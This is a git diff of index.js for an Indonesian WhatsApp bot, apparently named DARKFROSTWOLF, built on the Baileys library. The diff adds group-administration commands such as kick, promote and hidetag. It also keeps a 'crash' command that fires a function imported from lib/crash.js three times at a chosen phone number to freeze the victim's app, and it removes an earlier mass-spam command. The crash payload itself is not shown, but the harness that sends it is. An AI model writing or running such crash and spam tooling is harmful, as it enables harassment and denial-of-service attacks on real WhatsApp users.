@@ -1,4 +1,4 @@
-// index.js - FIXED: NO DATABASE, FIX CRASH, FIX HIDETAG, FIX OWNER
+// index.js - FINAL FIX: GROUP COMMANDS, PING LATENCY, & CRASH HANDLING
 const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay } = require('@whiskeysockets/baileys');
 const qrcode = require('qrcode-terminal');
 const pino = require('pino');
@@ -6,6 +6,7 @@ const fs = require('fs');
 const config = require('./config.js');
 const readline = require('readline');
 const chalk = require('chalk');
+const moment = require('moment-timezone');
 
 // Import functions
 const { xeoninvisible } = require('./lib/crash.js');
@@ -22,7 +23,7 @@ async function askPhoneNumber() {
   }
   const question = (text) => new Promise((resolve) => rl.question(text, resolve));
   console.log(chalk.red.bold('\n╔════════════════════════════════════════╗'));
-  console.log(chalk.red.bold('║   🚀 DARKFROSTWOLF BOT - PUBLIC v3.0   ║'));
+  console.log(chalk.red.bold('║   🚀 DARKFROSTWOLF BOT - ULTIMATE v4   ║'));
   console.log(chalk.red.bold('╚════════════════════════════════════════╝'));
   return await question(chalk.yellow('\n📱 Masukkan Nomor Bot (62xxx): '));
 }
@@ -63,7 +64,7 @@ async function connectToWhatsApp() {
     if (qr && config.connectionMethod === 'qr') qrcode.generate(qr, { small: true });
     
     if (connection === 'open') {
-      console.log(chalk.green('\n✅ BOT SIAP! (Mode: Public - No Database)'));
+      console.log(chalk.green('\n✅ BOT SIAP! Semua fitur aktif.'));
     }
     
     if (connection === 'close') {
@@ -83,14 +84,13 @@ async function connectToWhatsApp() {
         const msg = m.messages[0];
         if (!msg.message) return;
 
-        // Ambil text pesan
         const text = msg.message.conversation || 
                      msg.message.extendedTextMessage?.text || 
                      msg.message.imageMessage?.caption || '';
         
         if (!text.startsWith(config.botPrefix)) return;
 
-        // Definisi Variabel
+        // DEFINISI VARIABEL PENTING
         const chatId = msg.key.remoteJid;
         const isGroup = chatId.endsWith('@g.us');
         const sender = isGroup ? (msg.key.participant || chatId) : chatId;
@@ -99,105 +99,188 @@ async function connectToWhatsApp() {
         const command = text.slice(config.botPrefix.length).trim().split(' ')[0].toLowerCase();
         const args = text.slice(config.botPrefix.length + command.length).trim().split(' ');
         const pushname = msg.pushName || 'User';
+        const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';
 
-        console.log(chalk.cyan(`📨 ${command} | Dari: ${senderNumber}`));
+        // LOG
+        console.log(chalk.cyan(`📨 ${command} | ${senderNumber} | ${isGroup ? 'Group' : 'PC'}`));
 
-        // === FITUR DIMULAI DI SINI ===
+        // === FUNGSI BANTUAN ===
+        const reply = (teks) => sock.sendMessage(chatId, { text: teks }, { quoted: msg });
 
-        // 1. MENU
-        if (command === 'menu') {
-            await showMenu(sock, chatId, pushname);
-        }
+        // CEK ADMIN (Hanya dipanggil jika command grup)
+        let isAdmins = false;
+        let isBotAdmins = false;
+        let groupMetadata = null;
 
-        // 2. OWNER (FIXED CONTACT)
-        else if (command === 'owner') {
-            const vcard = 'BEGIN:VCARD\n' + 
-                          'VERSION:3.0\n' + 
-                          `FN:${config.ownerName}\n` + // Nama Owner
-                          `TEL;type=CELL;type=VOICE;waid=${config.ownerNumber}:${config.ownerNumber}\n` + 
-                          'END:VCARD';
-
-            await sock.sendMessage(chatId, { 
-                contacts: { 
-                    displayName: config.ownerName, 
-                    contacts: [{ vcard }] 
-                }
-            });
-            await sock.sendMessage(chatId, { text: 'Itu nomor owner saya, jangan disepam ya kak!' });
-        }
-
-        // 3. CRASH (FIXED)
-        else if (command === 'crash') {
-            if (!args[0]) return sock.sendMessage(chatId, { text: `Format: ${config.botPrefix}crash 628xxx` });
-            
-            const target = args[0].replace(/\D/g, '');
-            await sock.sendMessage(chatId, { text: `☠️ MENGIRIM BUG KE ${target}...` });
-
-            try {
-                // Loop sesuai setting di config, default 3x kalau user ga masukin jumlah
-                const repeat = 3; 
-                for (let i = 0; i < repeat; i++) {
-                    await xeoninvisible(sock, target);
-                    console.log(chalk.red(`[💥] Hit ${i+1}/${repeat}`));
-                    await delay(2000); // Delay wajib biar ga error network
-                }
-                await sock.sendMessage(chatId, { text: `✅ SUKSES! Target ${target} kemungkinan freeze.` });
-            } catch (err) {
-                console.log(err);
-                await sock.sendMessage(chatId, { text: '❌ Gagal mengirim crash (Error Network/Baileys).' });
+        if (isGroup) {
+            // Kita fetch metadata hanya jika command membutuhkannya
+            if (['kick', 'add', 'promote', 'demote', 'linkgroup', 'tagall', 'hidetag', 'infogrup', 'infogroup'].includes(command)) {
+                try {
+                    groupMetadata = await sock.groupMetadata(chatId);
+                    const participants = groupMetadata.participants;
+                    const admins = participants.filter(v => v.admin !== null).map(v => v.id);
+                    isAdmins = admins.includes(sender);
+                    isBotAdmins = admins.includes(botNumber);
+                } catch (e) { console.log('Gagal fetch admin') }
             }
         }
 
-        // 4. SPAM (FIXED)
-        else if (command === 'spam') {
-            if (args.length < 3) return sock.sendMessage(chatId, { text: `Format: ${config.botPrefix}spam 628xxx 10 P` });
-            const target = args[0];
-            const count = parseInt(args[1]);
-            const pesan = args.slice(2).join(' ');
+        // === COMMANDS ===
 
-            await sock.sendMessage(chatId, { text: `🚀 Mengirim ${count} spam...` });
-            await spamMassal(sock, target, count, pesan);
-            await sock.sendMessage(chatId, { text: '✅ Spam selesai.' });
+        // 1. PING (REAL LATENCY)
+        if (command === 'ping') {
+            const start = Date.now();
+            await sock.sendMessage(chatId, { text: '🏓 Testing...' });
+            const lat = Date.now() - start;
+            await sock.sendMessage(chatId, { text: `🚀 Speed: ${lat}ms` });
         }
 
-        // 5. HIDETAG (FIXED)
-        else if (command === 'hidetag' || command === 'tagall') {
-            if (!isGroup) return sock.sendMessage(chatId, { text: '❌ Khusus Grup!' });
+        // 2. CRASH (FIXED)
+        else if (command === 'crash') {
+            if (!args[0]) return reply(`Format: ${config.botPrefix}crash 628xxx`);
+            const target = args[0].replace(/\D/g, '');
             
-            // Ambil pesan setelah command
-            const pesan = args.join(' ') || 'Halo semua!';
-            
-            // Ambil metadata grup
-            const metadata = await sock.groupMetadata(chatId);
-            const participants = metadata.participants.map(v => v.id);
+            await reply(`☠️ MENGIRIM BUG KE ${target}...`);
 
-            // Kirim pesan dengan mention semua orang
+            // Paksa tanpa try-catch berlebihan di sini, handle di lib
+            const repeat = 3;
+            for (let i = 0; i < repeat; i++) {
+                await xeoninvisible(sock, target);
+                console.log(chalk.red(`[💥] Hit ${i+1}/${repeat}`));
+                await delay(2000);
+            }
+            await reply(`✅ SELESAI! Target ${target} down.`);
+        }
+
+        // === FITUR GRUP ===
+
+        // 3. TAG ALL (VISIBLE MENTION)
+        else if (command === 'tagall') {
+            if (!isGroup) return reply('❌ Khusus Grup!');
+            if (!isAdmins) return reply('❌ Khusus Admin!');
+            
+            let teks = `*👥 TAG ALL MEMBER*\n*Group:* ${groupMetadata.subject}\n\n`;
+            for (let mem of groupMetadata.participants) {
+                teks += `┣ ➥ @${mem.id.split('@')[0]}\n`;
+            }
+            
             await sock.sendMessage(chatId, { 
-                text: pesan, 
-                mentions: participants 
+                text: teks, 
+                mentions: groupMetadata.participants.map(a => a.id) 
             });
         }
 
-        // 6. KICK
-        else if (command === 'kick') {
-            if (!isGroup) return sock.sendMessage(chatId, { text: '❌ Khusus Grup!' });
-            let target;
+        // 4. HIDE TAG (HIDDEN MENTION)
+        else if (command === 'hidetag') {
+            if (!isGroup) return reply('❌ Khusus Grup!');
+            if (!isAdmins) return reply('❌ Khusus Admin!');
             
+            const teks = args.join(' ') || 'Halo semua!';
+            await sock.sendMessage(chatId, { 
+                text: teks, 
+                mentions: groupMetadata.participants.map(a => a.id) 
+            });
+        }
+
+        // 5. INFO GROUP
+        else if (command === 'infogroup' || command === 'infogrup') {
+            if (!isGroup) return reply('❌ Khusus Grup!');
+            
+            const textInfo = `
+📋 *INFO GROUP*
+
+🏷️ *Nama:* ${groupMetadata.subject}
+🆔 *ID:* ${groupMetadata.id}
+👑 *Owner:* @${(groupMetadata.owner || '').split('@')[0]}
+👥 *Member:* ${groupMetadata.participants.length}
+📝 *Deskripsi:* ${groupMetadata.desc?.toString() || '-'}
+`;
+            await sock.sendMessage(chatId, { 
+                text: textInfo, 
+                mentions: [groupMetadata.owner].filter(v => v) 
+            });
+        }
+
+        // 6. LINK GROUP
+        else if (command === 'linkgroup') {
+            if (!isGroup) return reply('❌ Khusus Grup!');
+            if (!isBotAdmins) return reply('❌ Bot harus jadi Admin dulu!');
+            
+            const code = await sock.groupInviteCode(chatId);
+            await reply(`https://chat.whatsapp.com/${code}`);
+        }
+
+        // 7. KICK
+        else if (command === 'kick') {
+            if (!isGroup) return reply('❌ Khusus Grup!');
+            if (!isAdmins) return reply('❌ Khusus Admin!');
+            if (!isBotAdmins) return reply('❌ Bot harus jadi Admin!');
+
+            let target;
             if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
                 target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
             } else if (msg.message.extendedTextMessage?.contextInfo?.participant) {
-                // Support reply pesan target
                 target = msg.message.extendedTextMessage.contextInfo.participant;
             } else {
-                return sock.sendMessage(chatId, { text: 'Tag orangnya atau reply chatnya!' });
+                return reply('Tag orang yang mau dikick!');
             }
 
-            try {
-                await sock.groupParticipantsUpdate(chatId, [target], 'remove');
-                await sock.sendMessage(chatId, { text: '👋 Dadah beban grup!' });
-            } catch (e) {
-                await sock.sendMessage(chatId, { text: '❌ Gagal kick (Jadikan bot admin dulu!)' });
-            }
+            await sock.groupParticipantsUpdate(chatId, [target], 'remove');
+            await reply('✅ Berhasil kick!');
+        }
+
+        // 8. ADD
+        else if (command === 'add') {
+            if (!isGroup) return reply('❌ Khusus Grup!');
+            if (!isAdmins) return reply('❌ Khusus Admin!');
+            if (!isBotAdmins) return reply('❌ Bot harus jadi Admin!');
+            if (!args[0]) return reply('Masukkan nomor! Contoh: .add 628xxx');
+
+            const target = args[0].replace(/\D/g, '') + '@s.whatsapp.net';
+            await sock.groupParticipantsUpdate(chatId, [target], 'add');
+            await reply('✅ Request add dikirim!');
+        }
+
+        // 9. PROMOTE
+        else if (command === 'promote') {
+            if (!isGroup) return reply('❌ Khusus Grup!');
+            if (!isAdmins) return reply('❌ Khusus Admin!');
+            if (!isBotAdmins) return reply('❌ Bot harus jadi Admin!');
+            
+            let target;
+            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
+                target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
+            } else if (msg.message.extendedTextMessage?.contextInfo?.participant) {
+                target = msg.message.extendedTextMessage.contextInfo.participant;
+            } else { return reply('Tag orangnya!'); }
+
+            await sock.groupParticipantsUpdate(chatId, [target], 'promote');
+            await reply('✅ Berhasil promote jadi admin!');
+        }
+
+        // 10. DEMOTE
+        else if (command === 'demote') {
+            if (!isGroup) return reply('❌ Khusus Grup!');
+            if (!isAdmins) return reply('❌ Khusus Admin!');
+            if (!isBotAdmins) return reply('❌ Bot harus jadi Admin!');
+            
+            let target;
+            if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
+                target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
+            } else if (msg.message.extendedTextMessage?.contextInfo?.participant) {
+                target = msg.message.extendedTextMessage.contextInfo.participant;
+            } else { return reply('Tag orangnya!'); }
+
+            await sock.groupParticipantsUpdate(chatId, [target], 'demote');
+            await reply('✅ Berhasil demote member!');
+        }
+
+        // 11. MENU & OWNER
+        else if (command === 'menu') {
+            await showMenu(sock, chatId, pushname);
+        }
+        else if (command === 'owner') {
+             await sock.sendMessage(chatId, { text: `Nih nomor owner gw: wa.me/${config.ownerNumber}` });
         }
 
     } catch (error) {
